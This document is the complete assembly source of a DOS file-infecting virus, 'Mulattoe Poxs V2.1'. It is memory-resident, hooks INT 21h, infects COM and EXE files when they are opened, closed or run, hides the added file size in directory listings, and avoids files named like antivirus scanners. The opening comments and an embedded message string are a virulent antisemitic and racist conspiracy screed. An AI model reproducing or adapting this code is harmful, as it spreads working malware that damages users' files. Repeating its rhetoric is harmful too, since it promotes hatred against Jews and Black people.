
; This Virus was hacked In Israel, to promote the Mongrelization of the
; White race in general, we the jews of Israel deem it antagonistic to Jewish
; Intrests that Whites are not all Mulattoes by now, we wish the further
; erode the barriers of racial mixing of Whites and Blacks, we believe
; that Mixing Whites with Blacks is a Better course for the FINAL SOLUTION
; of the White problem on this earth, we Jews deem it G-Ds bidding and choice
; that We rule over the earth and its people as WE see fit, not how the goyim
; See fit.. And for the NEW WORLD ORDER which was pledged to us! Oct. 6, 1940
; New York Times and Look Magazine I predict, Jan, 16, 1962
;
; We have desided with the grace of G-D to make a New Variant of this Virus
; The B'nai B'rith has received it's orders, the ADL is now indoctrinated
; to the will of the Israeli government, Prepare for Extinction through
; Miscgenation you white scum goyim!
;
; We were very estatic over the release of our first Miscgenating virus
; we forgot to check our holy talmudic spelling
;
; It's the Holy Talmudic Mulattoe Poxs Virus! Mulattoes to the Western world!
;			-=*=Mulattoe Poxs V2.1=*=-

virus_size      equ     last - init_virus       ;Virus size                
mut1            equ     3                                                  
mut2            equ     1                                                  
mut3            equ     103h                    ;Offset location           
                                                                           
seg_a          segment   byte public                                       
               assume    cs:seg_a, ds:seg_a                                
                org     100h                    ;COM file!                 
rocko           proc    far                                                
start:          jmp     init_virus                                         
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Virus Begins Here...                               
;------------------------------------------------------------------------- 
init_virus:     call    doit_now                ;Doit VirusMan...          
doit_now:       pop     bp                      ;Not to Lose Track         
                sub     bp,83h                 ;Set our position          
		sub	bp,83h
                push    ax                      ;Save all the regesters    
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    si                                                 
                push    di                                                 
                push    bp                                                 
                push    es                                                 
                push    ds                                                 
                mov     ax,4000h               ;Are we resident Already?  
		add	ax,9cbah
                int     21h                     ;***McAfee Scan String!    
                cmp     bx,0dcbah               ;Yupe... Quit Then...      
                je      exit_com                                           
                push    cs                      ;Get CS=DS                 
                pop     ds                                                 
                mov     cx,es                                              
                mov     ax,3521h                ;Sometimes tend to inter-  
                int     21h                     ;cept this Interrupt...    
                mov     word ptr cs:[int21+2][bp],es    ;Save the Int      
                mov     word ptr cs:[int21][bp],bx      ;Vector Table      
                dec     cx                      ;Get a new Memory block    
                mov     es,cx                   ;Put it Back to ES         
                mov     bx,es:mut1              ;Get TOM size              
                mov     dx,virus_size           ;Virus size in DX          
                mov     cl,4                    ;Shift 4 bits              
                shr     dx,cl                   ;Fast way to divide by 16  
                add     dx,4                    ;add 1 more para segment   
                mov     cx,es                   ;current MCB segment       
                sub     bx,dx                   ;sub virus_size from TOM   
                inc     cx                      ;put back right location   
                mov     es,cx                                              
                mov     ah,4ah                  ;Set_block                 
                int     21h                                                
                                                                           
                jc      exit_com                                           
                mov     ah,48h                  ;now allocate it           
                dec     dx                      ;number of para            
                mov     bx,dx                   ;                          
                int     21h                                                
                jc      exit_com                                           
                dec     ax                      ;get MCB                   
                mov     es,ax                                              
                mov     cx,8h                   ;Made DOS the owner of MCB 
                mov     es:mut2,cx              ;put it...                 
                sub     ax,0fh                  ;get TOM                   
                mov     di,mut3                 ;beginnig of our loc in mem
                mov     es,ax                   ;                          
;               mov     si,bp                   ;delta pointer             
;               add     si,offset init_virus    ;where to start            
		lea	si, [bp+offset init_virus]
                mov     cx,virus_size                                      
                cld                                                        
                repne   movsb                    ;move us                  
                                                                           
                mov     ax,2521h                ;Restore Int21 with ours   
                mov     dx,offset int21_handler ;Where it starts           
                push    es                                                 
                pop     ds                                                 
                int     21h                                                
exit_com:       push    cs                                                 
                pop     ds                                                 
                cmp     word ptr cs:[buffer][bp],5A4Dh                     
                je      exit_exe_file                                      
;               mov     bx,offset buffer        ;Its a COM file restore    
;               add     bx,bp                   ;First three Bytes...      
		lea	bx, [bp+offset buffer]
                mov     ax,[bx]                 ;Mov the Byte to AX        
                mov     word ptr ds:[100h],ax   ;First two bytes Restored  
                add     bx,2                    ;Get the next Byte         
                mov     al,[bx]                 ;Move the Byte to AL       
                mov     byte ptr ds:[102h],al   ;Restore the Last of 3b    
                pop     ds                                                 
                pop     es                                                 
                pop     bp                      ;Restore Regesters         
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
;               mov     ax,100h                 ;Jump Back to Beginning    
		mov	ax,0fEffh
		not	ax
                push    ax                      ;Restores our IP (a CALL   
                retn                            ;Saves them, now we changed
command         db      "C:\COMMAND.COM",0                                 
                                                                           
exit_exe_file:  mov     bx,word ptr cs:[vir_cs][bp]     ;fix segment loc   
                mov     dx,cs                           ;                  
                sub     dx,bx                                              
                mov     ax,dx                                              
                add     ax,word ptr cs:[exe_cs][bp]     ;add it to our segs
                add     dx,word ptr cs:[exe_ss][bp]                        
                mov     bx,word ptr cs:[exe_ip][bp]                        
                mov     word ptr cs:[fuck_yeah][bp],bx                     
                mov     word ptr cs:[fuck_yeah+2][bp],ax                   
                mov     ax,word ptr cs:[exe_ip][bp]                        
                mov     word ptr cs:[Rock_fix1][bp],dx                     
                mov     word ptr cs:[Rock_fix2][bp],ax                     
                pop     ds                                                 
                pop     es                                                 
                pop     bp                                                 
                pop     di                                                 
                pop     si                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                db      0B8h                   ;nothing but MOV AX,XXXX    
Rock_Fix1:                                                                 
                dw      0                                                  
                cli                                                        
                mov     ss,ax                                              
                db      0BCh                   ;nothing but MOV SP,XXXX    
Rock_Fix2:                                                                 
                dw      0                                                  
                sti                                                        
                db      0EAh                    ;nothing but JMP XXXX:XXXX 
Fuck_yeah:                                                                 
                dd      0                                                  
int21           dd      ?                       ;Our Old Int21             
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Dir Handler                                        
;------------------------------------------------------------------------- 
old_dir:        call    calldos21               ;get FCB                   
                test    al,al                   ;error?                    
                jnz     old_out                 ;nope                      
                push    ax                                                 
                push    bx                                                 
                push    es                                                 
                mov     ah,51h                  ;get PSP                   
                int     21h                                                
                mov     es,bx                   ;                          
                cmp     bx,es:[16h]             ;                          
                jnz     not_infected                                       
                mov     bx,dx                                              
                mov     al,[bx]                                            
                push    ax                                                 
                mov     ah,2fh                                             
                int     21h                                                
                pop     ax                                                 
                inc     al                       ;Extended FCB?            
                jnz     fcb_okay                                           
                add     bx,7h                                              
fcb_okay:       mov     ax,es:[bx+17h]                                     
                and     ax,1fh                                             
                cmp     al,1eh                                             
                jnz     not_infected                                       
                and     byte ptr es:[bx+17h],0e0h       ;fix secs          
                sub     word ptr es:[bx+1dh],virus_size                    
                sbb     word ptr es:[bx+1fh],0                             
not_infected:   pop     es                                                 
                pop     bx                                                 
                pop     ax                                                 
old_out:        iret                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                       Int 21 Handler                                     
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
int21_handler:  cmp     ah,11h                                             
                je      old_dir                                            
                cmp     ah,12h                                             
                je      old_dir                                            
                cmp     ax,4b00h                ;File executed             
                je      dis_infect                                         
                cmp     ah,3dh                                             
                je      check_file                                         
                cmp     ah,3eh                                             
                je      check_file2                                        
;               cmp     ax,0dcbah               ;Virus testing             
		sub	ax,9cbah
		cmp	ax,4000h
		add	ax,9cbah
                jne     int21call                                          
		sub	bx,9cbah
                mov     bx,4000h                                          
		add	bx,9cbah
int21call:      jmp     dword ptr cs:[int21]    ;Split...                  
                                                                           
check_file:     jmp     opening_file            ;Like a Charm              
check_file2:    jmp     closing_file                                       
dis_infect:     call    disinfect               ;EXE & COM okay            
dont_disinfect: push    dx                                                 
                pushf                                                      
                push    cs                                                 
                call    int21call                                          
                pop     dx                                                 
                                                                           
execute:        push    ax                                                 
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    ds                                                 
                                                                           
                push    ax                                                 
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    ds                                                 
                push    bp                                                 
                push    cs                                                 
                pop     ds                                                 
                mov     dx,offset command                                  
                mov     bp,0dcbah                                          
                jmp     command1                                           
command_ret:    pop     bp                                                 
                pop     ds                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                call    check_4_av                                         
                jc      exit1                                              
command1:       mov     ax,4300h                ;Get file Attribs          
                call    calldos21                                          
                jc      exit1                                              
                test    cl,1h                   ;Make sure there normal    
                jz      open_file               ;Okay there are            
                and     cl,0feh                 ;Nope, Fix them...         
                mov     ax,4301h                ;Save them now             
                call    calldos21                                          
                jc      exit                                               
open_file:      mov     ax,3D02h                                           
                call    calldos21                                          
exit1:          jc      exit                                               
                xchg    bx,ax                   ;BX File handler           
                mov     ax,5700h                ;Get file TIME + DATE      
                Call    calldos21                                          
                mov     al,cl                                              
                or      cl,1fh                  ;Un mask Seconds           
                dec     cx                      ;60 seconds                
                xor     al,cl                   ;Is it 60 seconds?         
                jz      exit                    ;File already infected     
                push    cs                                                 
                pop     ds                                                 
                mov     word ptr ds:[old_time],cx       ;Save Time         
                mov     word ptr ds:[old_date],dx       ;Save Date         
                mov     ah,3Fh                                             
                mov     cx,1Bh                          ;Read first 1B     
                mov     dx,offset ds:[buffer]           ;into our Buffer   
                call    calldos21                                          
                jc      exit_now                        ;Error Split       
                mov     ax,4202h                        ;Move file pointer 
                xor     cx,cx                           ;to EOF File       
                xor     dx,dx                                              
                call    calldos21                                          
                jc      exit_now                        ;Error Split       
                cmp     word ptr ds:[buffer],5A4Dh      ;Is file an EXE?   
                je      exe_infect                      ;Infect EXE file   
                mov     cx,ax                                              
                sub     cx,3                            ;Set the JMP       
                mov     word ptr ds:[jump_address+1],cx                    
                call    infect_me                       ;Infect!           
                jc      exit                                               
                mov     ah,40h                          ;Write back the    
                mov     dx,offset jump_address                             
                mov     cx,3h                                              
                call    calldos21                                          
exit_now:                                                                  
                mov     cx,word ptr ds:[old_time]       ;Restore old time  
                mov     dx,word ptr ds:[old_date]       ;Restore Old date  
                mov     ax,5701h                                              
                call    calldos21                                          
                mov     ah,3Eh                                             
                call    calldos21                                          
exit:           cmp     bp,0dcbah                                          
                je      command2                                           
                pop     ds                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                iret                                                       
command2:       jmp     command_ret                                        
                                                                           
exe_infect:     mov     cx,word ptr cs:[buffer+20]                         
                mov     word ptr cs:[exe_ip],cx                            
                mov     cx,word ptr cs:[buffer+22]                         
                mov     word ptr cs:[exe_cs],cx                            
                mov     cx,word ptr cs:[buffer+16]                         
                mov     word ptr cs:[exe_sp],cx                            
                mov     cx,word ptr cs:[buffer+14]                         
                mov     word ptr cs:[exe_ss],cx                            
                push    ax                                                 
                push    dx                                                 
                call    multiply                                           
                sub     dx,word ptr cs:[buffer+8]                          
                mov     word ptr cs:[vir_cs],dx                            
                push    ax                                                 
                push    dx                                                 
                call    infect_me                                          
                pop     dx                                                 
                pop     ax                                                 
                mov     word ptr cs:[buffer+22],dx                         
                mov     word ptr cs:[buffer+20],ax                         
                pop     dx                                                 
                pop     ax                                                 
                jc      exit                                               
                add     ax,virus_size                                      
                adc     dx,0                                               
                push    ax                                                 
                push    dx                                                 
                call    multiply                                           
                sub     dx,word ptr cs:[buffer+8]                          
                add     ax,40h                                             
                mov     word ptr cs:[buffer+14],dx                         
                mov     word ptr cs:[buffer+16],ax                         
                pop     dx                                                 
                pop     ax                                                 
                push    bx                                                 
                push    cx                                                 
                mov     cl,7                                               
                shl     dx,cl                                              
                xchg    bx,ax                                              
                mov     cl,9                                               
                shr     bx,cl                                              
                add     dx,bx                                              
                and     ax,1FFh                                            
                jz      outta_here                                         
                inc     dx                                                 
outta_here:     pop     cx                                                 
                pop     bx                                                 
                mov     word ptr cs:[buffer+2],ax                          
                mov     word ptr cs:[buffer+4],dx                          
                mov     ah,40h                                             
                mov     dx,offset ds:[buffer]                              
                mov     cx,20h                                             
                call    calldos21                                          
exit_exe:       jmp     exit_now                                           
rocko           endp                                                       
vir_cs          dw      0                                                  
exe_ip          dw      0                                                  
exe_cs          dw      0                                                  
exe_sp          dw      0                                                  
exe_ss          dw      0                                                  
exe_sz          dw      0                                                  
exe_rm          dw      0                                                  
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                   Opening File handle AX=3D                              
;------------------------------------------------------------------------- 
opening_file:   call    check_extension                                    
                jnc     open_fuck2                                         
                call    check_exten_exe                                    
                jnc     open_fuck2                                         
                jmp     dword ptr cs:[int21]                               
open_fuck2:     push    ax                                                 
                mov     ax,3d02h                                           
                call    calldos21                                          
                jnc     open_fuck1                                         
                pop     ax                                                 
                iret                                                       
open_fuck1:     push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    ds                                                 
                xchg    bx,ax                                              
                mov     ax,5700h                                           
                call    calldos21                                          
                mov     al,cl                                              
                or      cl,1fh                                             
                dec     cx                      ;60 Seconds                
                xor     al,cl                                              
                jnz     opening_exit3                                      
                dec     cx                                                 
                mov     word ptr cs:[old_time],cx                          
                mov     word ptr cs:[old_date],dx                          
                mov     ax,4202h                ;Yes Pointer to EOF        
                xor     cx,cx                                              
                xor     dx,dx                                              
                call    calldos21                                          
                mov     cx,dx                                              
                mov     dx,ax                                              
                push    cx                                                 
                push    dx                                                 
                sub     dx,1Bh                  ;Get first 3 Bytes         
                sbb     cx,0                                               
                mov     ax,4200h                                           
                call    calldos21                                          
                push    cs                                                 
                pop     ds                                                 
                mov     ah,3fh                  ;Read them into Buffer     
                mov     cx,1Bh                                             
                mov     dx,offset buffer                                   
                call    calldos21                                          
                xor     cx,cx                   ;Goto Beginning of File    
                xor     dx,dx                                              
                mov     ax,4200h                                           
                call    calldos21                                          
                mov     ah,40h                  ;Write first three bytes   
                mov     dx,offset buffer                                   
                mov     cx,1Bh                                             
                cmp     word ptr cs:[buffer],5A4Dh                         
                je      open_exe_jmp                                       
                mov     cx,3h                                              
open_exe_jmp:   call    calldos21                                          
                pop     dx                      ;EOF - Virus_Size          
                pop     cx                      ;to get ORIGINAL File size 
                sub     dx,virus_size                                      
                sbb     cx,0                                               
                mov     ax,4200h                                           
                call    calldos21                                          
                mov     ah,40h                  ;Fix Bytes                 
                xor     cx,cx                                              
                call    calldos21                                          
                mov     cx,word ptr cs:[old_time]                          
                mov     dx,word ptr cs:[old_date]                          
                mov     ax,5701h                                           
                int     21h                                                
                mov     ah,3eh                  ;Close File                
                call    calldos21                                          
opening_exit3:  pop     ds                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                jmp     dword ptr cs:[int21]                               
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                   Closing File Handle INFECT it!                         
;------------------------------------------------------------------------- 
closing_file:   cmp     bx,0h                                              
                je      closing_bye                                        
                cmp     bx,5h                                              
                ja      close_cont                                         
closing_bye:    jmp     dword ptr cs:[int21]                               
                                                                           
close_cont:     push    ax                                                 
                push    bx                                                 
                push    cx                                                 
                push    dx                                                 
                push    di                                                 
                push    ds                                                 
                push    es                                                 
                push    bp                                                 
                push    bx                                                 
                mov     ax,1220h                                           
                int     2fh                                                
                mov     ax,1216h                                           
                mov     bl,es:[di]                                         
                int     2fh                                                
                pop     bx                                                 
                add     di,0011h                                           
                mov     byte ptr es:[di-0fh],02h                           
                add     di,0017h                                           
                cmp     word ptr es:[di],'OC'                              
                jne     closing_next_try                                   
                cmp     byte ptr es:[di+2h],'M'                            
                jne     pre_exit                                           
                jmp     closing_cunt3                                      
closing_next_try:                                                          
                cmp     word ptr es:[di],'XE'                              
                jne     pre_exit                                           
                cmp     byte ptr es:[di+2h],'E'                            
                jne     pre_exit                                           
closing_cunt:   cmp     word ptr es:[di-8],'CS'                            
                jnz     closing_cunt1              ;SCAN                   
                cmp     word ptr es:[di-6],'NA'                            
                jz      pre_exit                                           
closing_cunt1:  cmp     word ptr es:[di-8],'-F'                            
                jnz     closing_cunt2              ;F-PROT                 
                cmp     word ptr es:[di-6],'RP'                            
                jz      pre_exit                                           
closing_cunt2:  cmp     word ptr es:[di-8],'LC'                            
                jnz     closing_cunt3                                      
                cmp     word ptr es:[di-6],'AE'    ;CLEAN                  
                jnz     closing_cunt3                                      
pre_exit:       jmp     closing_nogood                                     
closing_cunt3:  mov     ax,5700h                                           
                call    calldos21                                          
                                                                           
                mov     al,cl                                              
                or      cl,1fh                                             
                dec     cx                              ;60 Seconds        
                xor     al,cl                                              
                jz      closing_nogood                                     
                push    cs                                                 
                pop     ds                                                 
                mov     word ptr ds:[old_time],cx                          
                mov     word ptr ds:[old_date],dx                          
                mov     ax,4200h                                           
                xor     cx,cx                                              
                xor     dx,dx                                              
                call    calldos21                                          
                mov     ah,3fh                                             
                mov     cx,1Bh                                             
                mov     dx,offset buffer                                   
                call    calldos21                                          
                jc      closing_no_good                                    
                mov     ax,4202h                                           
                xor     cx,cx                                              
                xor     dx,dx                                              
                call    calldos21                                          
                jc      closing_no_good                                    
                cmp     word ptr ds:[buffer],5A4Dh                         
                je      closing_exe                                        
                mov     cx,ax                                              
                sub     cx,3h                                              
                mov     word ptr ds:[jump_address+1],cx                    
                call    infect_me                                          
                jc      closing_no_good                                    
                mov     ah,40h                                             
                mov     dx,offset jump_address                             
                mov     cx,3h                                              
                call    calldos21                                          
closing_no_good:                                                           
                mov     cx,word ptr ds:[old_time]                          
                mov     dx,word ptr ds:[old_date]                          
                mov     ax,5701h                                           
                call    calldos21                                          
closing_nogood: pop     bp                                                 
                pop     es                                                 
                pop     ds                                                 
                pop     di                                                 
                pop     dx                                                 
                pop     cx                                                 
                pop     bx                                                 
                pop     ax                                                 
                jmp     dword ptr cs:[int21]                               
closing_exe:    mov     cx,word ptr cs:[buffer+20]                         
                mov     word ptr cs:[exe_ip],cx                            
                mov     cx,word ptr cs:[buffer+22]                         
                mov     word ptr cs:[exe_cs],cx                            
                mov     cx,word ptr cs:[buffer+16]                         
                mov     word ptr cs:[exe_sp],cx                            
                mov     cx,word ptr cs:[buffer+14]                         
                mov     word ptr cs:[exe_ss],cx                            
                push    ax                                                 
                push    dx                                                 
                call    multiply                                           
                sub     dx,word ptr cs:[buffer+8]                          
                mov     word ptr cs:[vir_cs],dx                            
                push    ax                                                 
                push    dx                                                 
                call    infect_me                                          
                pop     dx                                                 
                pop     ax                                                 
                mov     word ptr cs:[buffer+22],dx                         
                mov     word ptr cs:[buffer+20],ax                         
                pop     dx                                                 
                pop     ax                                                 
                jc      closing_no_good                                    
                add     ax,virus_size                                      
                adc     dx,0                                               
                push    ax                                                 
                push    dx                                                 
                call    multiply                                           
                sub     dx,word ptr cs:[buffer+8]                          
                add     ax,40h                                             
                mov     word ptr cs:[buffer+14],dx                         
                mov     word ptr cs:[buffer+16],ax                         
                pop     dx                                                 
                pop     ax                                                 
                push    bx                                                 
                push    cx                                                 
                mov     cl,7                                               
                shl     dx,cl                                              
                xchg    bx,ax                                              
                mov     cl,9                                               
                shr     bx,cl                                              
                add     dx,bx                                              
                and     ax,1FFh                                            
                jz      close_split                                        
                inc     dx                                                 
close_split:    pop     cx                                                 
                pop     bx                                                 
                mov     word ptr cs:[buffer+2],ax                          
                mov     word ptr cs:[buffer+4],dx                          
                mov     ah,40h                                             
                mov     dx,offset ds:[buffer]                              
                mov     cx,20h                                             
                call    calldos21                                          
closing_over:   jmp     closing_no_good                                    
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                   Infection Routine...                                   
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
infect_me       proc                                                       
                mov     ah,40h                                             
                mov     dx,offset init_virus                               
                mov     cx,virus_size                                      
                call    calldos21                                          
                jc      exit_error                      ;Error Split       
                mov     ax,4200h                                           
                xor     cx,cx                           ;Pointer back to   
                xor     dx,dx                           ;top of file       
                call    calldos21                                          
                jc      exit_error                      ;Split Dude...     
                clc                                     ;Clear carry flag  
                ret                                                        
exit_error:                                                                
                stc                                     ;Set carry flag    
                ret                                                        
infect_me       endp                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;               DisInfection Routine for 4B                                
;------------------------------------------------------------------------- 
Disinfect       PROC                                                       
                push    ax                                                 
                push    bx                      ;Save them                 
                push    cx                                                 
                push    dx                                                 
                push    ds                                                 
                mov     ax,4300h                ;Get file Attribs          
                call    calldos21                                          
                test    cl,1h                   ;Test for Normal Attribs   
                jz      okay_dis                ;Yes, File can be opened   
                and     cl,0feh                 ;No, Set them to Normal    
                mov     ax,4301h                ;Save attribs to file      
                call    calldos21                                          
                jc      half_way                                           
okay_dis:       mov     ax,3d02h                ;File now can be opened    
                call    calldos21               ;Safely                    
                jc      half_way                                           
                xchg    bx,ax                   ;Put File Handle in BX     
                mov     ax,5700h                ;Get File Time & Date      
                call    calldos21                                          
                mov     al,cl                   ;Check to see if infected  
                or      cl,1fh                  ;Unmask Seconds            
                dec     cx                      ;Test to see if 60 seconds 
                xor     al,cl                                              
                jnz     half_way                ;No, Quit File AIN'T       
                dec     cx                                                 
                mov     word ptr cs:[old_time],cx                          
                mov     word ptr cs:[old_date],dx                          
                mov     ax,4202h                ;Yes, file is infected     
                xor     cx,cx                   ;Goto the End of File      
                xor     dx,dx                                              
                call    calldos21                                          
                push    cs                                                 
                pop     ds                                                 
                mov     cx,dx                   ;Save Location into        
                mov     dx,ax                   ;CX:DX                     
                push    cx                      ;Push them for later use   
                push    dx                                                 
                sub     dx,1Bh                  ;Subtract file 1Bh from the
                sbb     cx,0                    ;End so you will find the  
                mov     ax,4200h                ;Original EXE header or    
                call    calldos21               ;First 3 bytes for COMs    
                mov     ah,3fh                  ;Read them into Buffer     
                mov     cx,1Bh                  ;Read all of the 1B bytes  
                mov     dx,offset buffer        ;Put them into our buffer  
                call    calldos21                                          
                jmp     half                                               
half_way:       jmp     end_dis                                            
half:           xor     cx,cx                   ;                          
                xor     dx,dx                   ;Goto the BEGINNING of file
                mov     ax,4200h                                           
                call    calldos21                                          
                mov     ah,40h                  ;Write first three bytes   
                mov     dx,offset buffer        ;from buffer to COM        
                mov     cx,1Bh                                             
                cmp     word ptr cs:[buffer],5A4Dh                         
                je      dis_exe_jmp                                        
                mov     cx,3h                                              
dis_exe_jmp:    call    calldos21                                          
                pop     dx                      ;Restore CX:DX which they  
                pop     cx                      ;to the End of FILE        
                sub     dx,virus_size           ;Remove Virus From the END 
                sbb     cx,0                    ;of the Orignal File       
                mov     ax,4200h                ;Get new EOF               
                call    calldos21                                          
                mov     ah,40h                  ;Write new EOF to File     
                xor     cx,cx                                              
                call    calldos21                                          
                mov     cx,word ptr cs:[old_time]                          
                mov     dx,word ptr cs:[old_date]                          
                mov     ax,5701h                                           
                call    calldos21                                          
                mov     ah,3eh                  ;Close File                
                call    calldos21                                          
end_dis:        pop     ds                                                 
                pop     dx                                                 
                pop     cx                      ;Restore 'em               
                pop     bx                                                 
                pop     ax                                                 
                ret                                                        
disinfect       ENDP                                                       
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;               Check File Extension DS:DX ASCIIZ                          
;--------------------------------------------------------------------------
Check_extension         PROC                                               
                push    si                                                 
                push    cx                                                 
                mov     si,dx                                              
                mov     cx,256h                                            
loop_me:        cmp     byte ptr ds:[si],2eh                               
                je      next_ok                                            
                inc     si                                                 
                loop    loop_me                                            
next_ok:        cmp     word ptr ds:[si+1],'OC'                            
                jne     next_1                                             
                cmp     byte ptr ds:[si+3],'M'                             
                je      good_file                                          
next_1:         cmp     word ptr ds:[si+1],'oc'                            
                jne     next_2                                             
                cmp     byte ptr ds:[si+3],'m'                             
                je      good_file                                          
next_2:         pop     cx                                                 
                pop     si                                                 
                stc                                                        
                ret                                                        
good_file:      pop     cx                                                 
                pop     si                                                 
                clc                                                        
                ret                                                        
Check_extension         ENDP                                               
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;               Check File Extension DS:DX ASCIIZ                          
;------------------------------------------------------------------------- 
Check_exten_exe         PROC                                               
                push    si                                                 
                push    cx                                                 
                mov     si,dx                                              
                mov     cx,256h                                            
loop_me_exe:    cmp     byte ptr ds:[si],2eh                               
                je      next_ok_exe                                        
                inc     si                                                 
                loop    loop_me_exe                                        
next_ok_exe:    cmp     word ptr ds:[si+1],'XE'                            
                jne     next_1_exe                                         
                cmp     byte ptr ds:[si+3],'E'                             
                je      good_file_exe                                      
next_1_exe:     cmp     word ptr ds:[si+1],'xe'                            
                jne     next_2_exe                                         
                cmp     byte ptr ds:[si+3],'e'                             
                je      good_file_exe                                      
next_2_exe:     pop     cx                                                 
                pop     si                                                 
                stc                                                        
                ret                                                        
good_file_exe:  pop     cx                                                 
                pop     si                                                 
                clc                                                        
                ret                                                        
Check_exten_exe         ENDP                                               
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                    Call Int_21h Okay                                     
;------------------------------------------------------------------------- 
calldos21        PROC                                                      
                pushf                                                      
                call    dword ptr cs:[int21]                               
                retn                                                       
calldos21        ENDP                                                      
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;                    MultiPly                                              
;--------------------------------------------------------------------------
multiply         PROC                                                      
                push    bx                                                 
                push    cx                                                 
                mov     cl,0Ch                                             
                shl     dx,cl                                              
                xchg    bx,ax                                              
                mov     cl,4                                               
                shr     bx,cl                                              
                and     ax,0Fh                                             
                add     dx,bx                                              
                pop     cx                                                 
                pop     bx                                                 
                retn                                                       
multiply         ENDP                                                      
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
;               Check for AV file... Like SCAN.EXE or F-PROT.EXE           
;------------------------------------------------------------------------- 
Check_4_av              PROC                                               
                push    si                                                 
                push    cx                                                 
                mov     si,dx                                              
                mov     cx,256h                                            
av:             cmp     byte ptr ds:[si],2eh                               
                je      av1                                                
                inc     si                                                 
                loop    av                                                 
av1:            cmp     word ptr ds:[si-2],'NA'                            
                jnz     av2                                                
                cmp     word ptr ds:[si-4],'CS'                            
                jz      fuck_av                                            
av2:            cmp     word ptr ds:[si-2],'NA'                            
                jnz     av3                                                
                cmp     word ptr ds:[si-4],'EL'                            
                jz      fuck_av                                            
av3:            cmp     word ptr ds:[si-2],'TO'                            
                jnz     not_av                                             
                cmp     word ptr ds:[si-4],'RP'                            
                jz      fuck_av                                            
not_av:         pop     cx                                                 
                pop     si                                                 
                clc                                                        
                ret                                                        
fuck_av:        pop     cx                                                 
                pop     si                                                 
                stc                                                        
                ret                                                        
Check_4_av              ENDP                                               
msg             db      "Death by Miscgenation DIE WHITE GOYIM DIE! '94(c) IsRaEl"
old_time        dw      0                                                  
old_date        dw      0                                                  
file_handle     dw      0                                                  
jump_address    db      0E9h,90h,90h                                       
buffer          db      90h,0CDh,020h           ;\                         
                db      18h DUP (00)            ;-Make 1Bh Bytes           
last:                                                                      
seg_a           ends                                                       
          end  start                                                       
